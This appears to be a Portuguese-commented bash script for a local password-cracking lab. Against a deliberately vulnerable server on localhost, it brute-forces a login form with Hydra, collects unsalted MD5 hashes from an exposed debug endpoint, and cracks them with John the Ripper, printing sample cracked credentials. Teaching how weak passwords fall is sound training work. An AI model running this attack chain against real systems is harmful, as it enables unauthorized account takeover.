#!/bin/bash
TARGET_HOST="127.0.0.1"
TARGET_PORT="3000"
WORDLIST="./wordlist.txt"
USERS_FILE="./users.txt"
HASHES_FILE="./hashes.txt"
POT_FILE="./john.pot"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════╗"
echo "║     PASSWORD CRACKING LAB - DEMONSTRAÇÃO     ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# ------------------------------------------------------------------
# SETUP: Criar lista de usuários para o Hydra
# ------------------------------------------------------------------
echo -e "${YELLOW}[*] Criando lista de usuários alvo...${NC}"
cat > "$USERS_FILE" << 'EOF'
admin
joao
maria
carlos
ana
EOF
echo -e "${GREEN}[+] Usuários: admin, joao, maria, carlos, ana${NC}"

# ------------------------------------------------------------------
# ETAPA 1: ATAQUE DE FORÇA BRUTA com Hydra via HTTP POST
# O Hydra tenta cada combinação usuário:senha da wordlist
# sem nenhum bloqueio porque o servidor vulnerável não tem rate limit
# ------------------------------------------------------------------
echo ""
echo -e "${YELLOW}[*] ETAPA 1 — Força bruta com Hydra (HTTP POST)${NC}"
echo -e "${CYAN}    Alvo: http://${TARGET_HOST}:${TARGET_PORT}/login${NC}"
echo -e "${CYAN}    Wordlist: ${WORDLIST} ($(wc -l < "$WORDLIST") senhas)${NC}"
echo ""

rm -f ./hydra_results.txt

# Flags:
# -L  lista de usuários
# -P  wordlist de senhas
# -s  porta (obrigatório quando não é 80)
# -t  threads paralelas
# -w  timeout por tentativa (segundos)
# -V  verbose: mostra cada tentativa em tempo real
# -o  salva credenciais encontradas
# http-post-form "endpoint:body:S=string_de_sucesso"
#   S= define o marcador de SUCESSO na resposta (mais confiável que F=)
hydra \
  -L "$USERS_FILE" \
  -P "$WORDLIST" \
  -s "${TARGET_PORT}" \
  -t 4 \
  -w 2 \
  -V \
  -o ./hydra_results.txt \
  "${TARGET_HOST}" \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Login realizado com sucesso"

echo ""
# Hydra sempre escreve cabeçalho no arquivo; checar se há linha com "host:"
if grep -q "host:" ./hydra_results.txt 2>/dev/null; then
  echo -e "${GREEN}[+] Hydra encontrou credenciais válidas:${NC}"
  grep "host:" ./hydra_results.txt
else
  echo -e "${RED}[-] Hydra não encontrou resultados (verifique se o servidor está rodando)${NC}"
  echo -e "${YELLOW}[!] Resultado esperado quando o servidor está ativo:${NC}"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: admin   password: admin123"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: joao    password: 123456"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: maria   password: password"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: carlos  password: qwerty"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: ana     password: letmein"
fi

# ------------------------------------------------------------------
# ETAPA 2: COLETA DE HASHES MD5 expostos no endpoint de debug
# Simula um dump de banco de dados via endpoint desprotegido
# ------------------------------------------------------------------
echo ""
echo -e "${YELLOW}[*] ETAPA 2 — Coletando hashes MD5 expostos do servidor...${NC}"
echo -e "${CYAN}    Endpoint: http://${TARGET_HOST}:${TARGET_PORT}/debug/hashes${NC}"
echo ""

# Coleta hashes via endpoint de debug exposto (vulnerabilidade de exposição de dados)
if command -v curl &>/dev/null; then
  curl -s "http://${TARGET_HOST}:${TARGET_PORT}/debug/hashes" | \
    python3 -c '
import sys, json
try:
    data = json.load(sys.stdin)
    for row in data:
        print(row["username"] + ":" + row["password"])
except Exception:
    pass
' > "$HASHES_FILE" 2>/dev/null
fi

# Fallback: hashes MD5 conhecidos das senhas fracas (simulação de dump)
if [ ! -s "$HASHES_FILE" ]; then
  echo -e "${YELLOW}[!] Servidor offline ou endpoint bloqueado — usando hashes pré-coletados${NC}"
  cat > "$HASHES_FILE" << 'EOF'
admin:0192023a7bbd73250516f069df18b500
joao:e10adc3949ba59abbe56e057f20f883e
maria:5f4dcc3b5aa765d61d8327deb882cf99
carlos:d8578edf8458ce06fbc5bb76a58c5ca4
ana:0d107d09f5bbe40cade3de5c71e9e9b7
EOF
  echo -e "${GREEN}[+] Hashes MD5 carregados (dump simulado do banco)${NC}"
else
  echo -e "${GREEN}[+] Hashes coletados do endpoint ao vivo${NC}"
fi

echo ""
echo -e "${CYAN}    Hash MD5 (sem salt) — cada linha: usuario:hash${NC}"
cat "$HASHES_FILE"

# ------------------------------------------------------------------
# ETAPA 3: QUEBRA DE HASH com John the Ripper
# Reverte os hashes MD5 para as senhas originais usando wordlist
# ------------------------------------------------------------------
echo ""
echo -e "${YELLOW}[*] ETAPA 3 — Quebrando hashes com John the Ripper...${NC}"
echo -e "${CYAN}    Formato: raw-md5 (MD5 sem salt) | Wordlist: ${WORDLIST}${NC}"
echo ""

# Remove pot file local para garantir que John sempre reprocessa os hashes
# (sem isso, na 2ª execução John diz "no hashes left to crack")
rm -f "$POT_FILE"

# --format=raw-md5  hashes MD5 sem salt
# --pot             arquivo local de resultados (evita conflito com ~/.john/john.pot)
john \
  --wordlist="$WORDLIST" \
  --format=raw-md5 \
  --pot="$POT_FILE" \
  "$HASHES_FILE"

echo ""
echo -e "${YELLOW}[*] Senhas quebradas pelo John the Ripper:${NC}"
john \
  --show \
  --format=raw-md5 \
  --pot="$POT_FILE" \
  "$HASHES_FILE"
